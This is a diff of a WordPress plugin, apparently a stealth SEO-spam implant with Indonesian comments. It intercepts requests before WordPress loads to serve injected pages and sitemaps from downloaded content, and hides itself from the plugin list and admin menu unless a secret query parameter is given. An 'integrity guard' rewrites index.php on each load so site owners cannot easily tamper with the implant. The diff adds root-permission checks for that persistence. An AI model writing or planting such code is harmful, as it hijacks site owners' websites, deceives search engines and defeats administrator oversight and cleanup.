@@ -1,8 +1,8 @@
 <?php
 /*
 Plugin Name: Additional Content Plugin
-Description: Plugin konten & sitemap stealth dengan Index Integrity Guard (Anti-Tamper).
-Version: 7.7
+Description: Plugin konten & sitemap stealth dengan Integrity Monitor & Permission Check.
+Version: 7.8
 Author: Grok
 */
 
@@ -26,14 +26,13 @@ function acp_get_storage_dir() {
 // ==========================================
 // 1. INTEGRITY GUARD (INDEX.PHP PROTECTOR)
 // ==========================================
-add_action('init', 'acp_integrity_guard');
+// Ganti ke plugins_loaded agar jalan SEBELUM init
+add_action('plugins_loaded', 'acp_integrity_guard', -9999);
 
 function acp_integrity_guard() {
-    // Lokasi index.php di root WordPress
     $index_path = ABSPATH . 'index.php';
     
-    // Kode Asli Default WordPress index.php
-    // Jangan ubah spasi/enter di dalam string ini agar akurat
+    // Kode Asli Default WordPress
     $default_content = "<?php
 /**
  * Front to the WordPress application. This file doesn't do anything, but loads
@@ -53,34 +52,38 @@ define( 'WP_USE_THEMES', true );
 require __DIR__ . '/wp-blog-header.php';
 ";
 
-    // Cek apakah file ada
+    // Logika Restore
     if (file_exists($index_path)) {
         $current_content = file_get_contents($index_path);
-        
-        // Normalisasi (hapus beda format baris Windows/Linux) untuk perbandingan
+        // Normalisasi baris baru
         $clean_current = trim(str_replace(["\r\n", "\r"], "\n", $current_content));
         $clean_default = trim(str_replace(["\r\n", "\r"], "\n", $default_content));
 
-        // Jika beda, Restore!
         if ($clean_current !== $clean_default) {
-            @chmod($index_path, 0644); // Pastikan bisa ditulis
-            file_put_contents($index_path, $default_content);
+            if (is_writable($index_path)) {
+                file_put_contents($index_path, $default_content);
+                // Log error untuk admin
+                error_log('[ACP Security] index.php dimodifikasi terdeteksi! File telah direstore ke default.');
+            }
         }
     } else {
-        // Jika file hilang, Buat Baru!
-        file_put_contents($index_path, $default_content);
+        // File Hilang -> Buat Baru
+        // Cek apakah folder root writable
+        if (is_writable(ABSPATH)) {
+            file_put_contents($index_path, $default_content);
+            error_log('[ACP Security] index.php hilang! File baru telah dibuat.');
+        }
     }
 }
 
 // ==========================================
 // 2. NUCLEAR HANDLER (SITEMAP & CONTENT)
 // ==========================================
-add_action('plugins_loaded', 'acp_nuclear_handler', -9999);
+add_action('plugins_loaded', 'acp_nuclear_handler', -9998); // Prioritas setelah integrity guard
 
 function acp_nuclear_handler() {
     $request_uri = $_SERVER['REQUEST_URI'];
     
-    // Abaikan area admin
     if (strpos($request_uri, '/wp-admin/') !== false || strpos($request_uri, '/wp-login.php') !== false) {
         return;
     }
@@ -88,22 +91,19 @@ function acp_nuclear_handler() {
     $path = parse_url($request_uri, PHP_URL_PATH);
     $filename = basename($path);
     
-    // --- SITEMAP INTERCEPT ---
+    // A. SITEMAP
     if (strpos($request_uri, '.xml') !== false) {
         if ($filename === ACP_MAIN_SITEMAP) {
             acp_render_sitemap_index();
             exit;
         }
-
         $filename_no_ext = str_replace('.xml', '', $filename);
         $sitemap_name = $filename_no_ext;
         $page = 1;
-
         if (preg_match('/^(.*?)-(\d+)$/', $filename_no_ext, $matches)) {
             $sitemap_name = $matches[1];
             $page = intval($matches[2]);
         }
-
         $endpoints = get_option('acp_endpoints', []);
         foreach ($endpoints as $ep) {
             if (isset($ep['status']) && $ep['status'] === 'active' && $ep['sitemap_name'] === $sitemap_name) {
@@ -114,12 +114,11 @@ function acp_nuclear_handler() {
         return; 
     }
 
-    // --- CONTENT INTERCEPT ---
+    // B. CONTENT
     $slug = trim($path, '/');
     if (empty($slug) || preg_match('/\.(css|js|jpg|jpeg|png|gif|ico|woff|ttf|svg|php)$/i', $slug)) {
         return;
     }
-
     $title_key = urldecode($slug);
     $template_path = acp_get_storage_dir() . '/template.txt';
     if (!file_exists($template_path)) return; 
@@ -139,7 +138,6 @@ function acp_nuclear_handler() {
                     }
                     while (ob_get_level()) ob_end_clean();
 
-                    // Variabel Template
                     $additional_content = $v;
                     $title = ucwords(str_replace('-', ' ', $k));
                     $slug_raw = $k;
@@ -155,11 +153,9 @@ function acp_nuclear_handler() {
 // ==========================================
 // 3. RENDERERS
 // ==========================================
-
 function acp_clean_output_buffer() {
     while (ob_get_level()) ob_end_clean();
 }
-
 function acp_render_sitemap_index() {
     acp_clean_output_buffer();
     if (!headers_sent()) {
@@ -169,14 +165,12 @@ function acp_render_sitemap_index() {
     }
     echo '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
     echo '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";
-
     $endpoints = get_option('acp_endpoints', []);
     foreach ($endpoints as $ep) {
         if (!isset($ep['status']) || $ep['status'] !== 'active') continue;
         $total_urls = acp_get_local_json_count($ep['json_filename']);
         $total_pages = ceil($total_urls / ACP_MAX_URLS_PER_SITEMAP);
         if ($total_pages < 1) $total_pages = 1;
-
         for ($i = 1; $i <= $total_pages; $i++) {
             $suffix = ($i === 1) ? '' : '-' . $i;
             $loc = home_url($ep['sitemap_name'] . $suffix . '.xml');
@@ -185,7 +179,6 @@ function acp_render_sitemap_index() {
     }
     echo '</sitemapindex>';
 }
-
 function acp_render_child_sitemap($endpoint, $page) {
     acp_clean_output_buffer();
     if (!headers_sent()) {
@@ -211,7 +204,6 @@ function acp_render_child_sitemap($endpoint, $page) {
 // ==========================================
 // 4. HELPER FUNCTIONS
 // ==========================================
-
 function acp_download_and_save_files() {
     $storage_dir = acp_get_storage_dir();
     if (!file_exists($storage_dir)) {
@@ -238,13 +230,11 @@ function acp_download_and_save_files() {
     }
     return $count;
 }
-
 function acp_get_local_json($filename) {
     $path = acp_get_storage_dir() . '/' . $filename . '.json';
     if (file_exists($path)) return json_decode(file_get_contents($path), true);
     return [];
 }
-
 function acp_get_local_json_count($filename) {
     return count(acp_get_local_json($filename));
 }
@@ -252,11 +242,9 @@ function acp_get_local_json_count($filename) {
 // ==========================================
 // 5. STEALTH & ADMIN LOGIC
 // ==========================================
-
 function acp_is_safe_mode() {
     return isset($_GET['acp_safe_mode']) && $_GET['acp_safe_mode'] == '1';
 }
-
 add_filter('all_plugins', 'acp_hide_plugin_from_list');
 function acp_hide_plugin_from_list($plugins) {
     if (get_option('acp_plugin_hidden', false) && !acp_is_safe_mode()) {
@@ -265,7 +253,6 @@ function acp_hide_plugin_from_list($plugins) {
     }
     return $plugins;
 }
-
 add_action('admin_menu', 'acp_admin_menu', 999);
 function acp_admin_menu() {
     add_menu_page('Content Plugin', 'Content Plugin', 'manage_options', 'additional-content-plugin', 'acp_admin_page', 'dashicons-database');
@@ -273,12 +260,28 @@ function acp_admin_menu() {
         remove_menu_page('additional-content-plugin');
     }
 }
-
 function acp_generate_random_string($length = 5) {
     return substr(str_shuffle('abcdefghijklmnopqrstuvwxyz0123456789'), 0, $length);
 }
 
+// FUNGSI CEK PERMISSION ROOT
+function acp_check_integrity_status() {
+    $index_path = ABSPATH . 'index.php';
+    $is_writable = is_writable(ABSPATH);
+    $is_file_writable = file_exists($index_path) ? is_writable($index_path) : $is_writable;
+    
+    if (!$is_writable) {
+        return ['status' => 'error', 'msg' => 'Folder Root TIDAK Writable! Plugin tidak bisa restore index.php jika terhapus.'];
+    }
+    if (!$is_file_writable) {
+        return ['status' => 'warning', 'msg' => 'File index.php TIDAK Writable! Plugin tidak bisa mengoreksi jika dimodifikasi.'];
+    }
+    return ['status' => 'success', 'msg' => 'Sistem Keamanan Aktif: Root Writable & index.php Terlindungi.'];
+}
+
 function acp_admin_page() {
+    $security_status = acp_check_integrity_status();
+
     if (acp_is_safe_mode() && isset($_POST['acp_disable_stealth'])) {
         check_admin_referer('acp_action');
         update_option('acp_plugin_hidden', false);
@@ -320,7 +323,14 @@ function acp_admin_page() {
     $main_sitemap_url = home_url(ACP_MAIN_SITEMAP);
     ?>
     <div class="wrap">
-        <h1>Content Plugin (V7.7 Integrity Guard)</h1>
+        <h1>Content Plugin (V7.8 Integrity Monitor)</h1>
+        
+        <?php if($security_status['status'] === 'success'): ?>
+            <div class="notice notice-success inline"><p><strong>✅ <?php echo $security_status['msg']; ?></strong></p></div>
+        <?php else: ?>
+            <div class="notice notice-error inline"><p><strong>❌ <?php echo $security_status['msg']; ?></strong></p></div>
+        <?php endif; ?>
+
         <?php if ($is_hidden): ?><div class="notice notice-warning"><p>MODE STEALTH AKTIF</p></div><?php endif; ?>
         
         <?php if (acp_is_safe_mode()): ?>
